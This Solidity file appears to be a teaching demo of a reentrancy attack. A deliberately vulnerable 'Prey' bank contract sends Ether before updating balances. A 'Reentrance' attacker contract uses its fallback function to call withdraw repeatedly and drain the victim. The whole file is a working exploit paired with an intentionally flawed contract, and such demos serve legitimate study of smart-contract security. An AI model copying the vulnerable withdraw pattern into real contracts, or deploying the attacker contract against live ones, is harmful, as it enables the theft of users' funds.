// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.8.0;
// pragma solidity ^0.8.0;

contract Prey {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
    
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        // balances[msg.sender] = 0;
        balances[msg.sender] -= amount; // 大于0.8.0的solidity编译器自带safemath，拥有益处检测机制。
    }

    // Helper function to check the balance of this contract
    function getConBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Reentrance {
    address public preyAddr;
    constructor(address _preyAddrAddress) {
        preyAddr = _preyAddrAddress;
    }

    // Fallback is called when preyAddr sends Ether to this contract.
    fallback() external payable {
        if (address(preyAddr).balance >= 1 ether) {
            preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        }
        
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        (bool success1,) = preyAddr.call{value: 1 ether}(abi.encodeWithSignature("deposit()")); 
        require(success1, "attack function, failed to deposit");
        (bool success2,) = preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        require(success2, "attack function, failed to withdraw");
    }

    // Helper function to check the balance of this contract
    function getConBalance() public view returns (uint) {
        return address(this).balance;
    }

    function setPreyAddre(address addr) public{
        preyAddr = addr;
    }
}
